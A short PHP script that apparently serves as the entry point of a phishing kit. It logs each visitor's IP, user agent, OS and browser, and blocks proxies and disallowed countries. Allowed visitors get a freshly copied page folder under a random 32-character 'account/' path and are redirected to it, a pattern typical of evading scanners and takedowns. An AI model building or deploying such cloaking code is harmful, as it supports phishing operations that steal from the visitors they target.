<?php
session_start();

require_once 'whois.php';
require_once 'functions.php';

/**
 * Const vars
 */
    $_SESSION['ip_address'] = $ip = getUserIP();
    $_SESSION['user_agent'] = $_SERVER ['HTTP_USER_AGENT'];
    $_SESSION['sys_os'] = getOS($_SESSION['user_agent']);
    $_SESSION['sys_br'] = getBrowser($_SESSION['user_agent']);



    if(geo_location($ip) == true){
        $_SESSION['access'] = true;
        $dist = "account/".generateRandomString(32);
        $src="src";
        recurse_copy( $src, $dist );
        header("LOCATION: ".$dist."");  
    }
    else{
        exit("proxy or country not allowed");
        $_SESSION['access'] = false;
    }
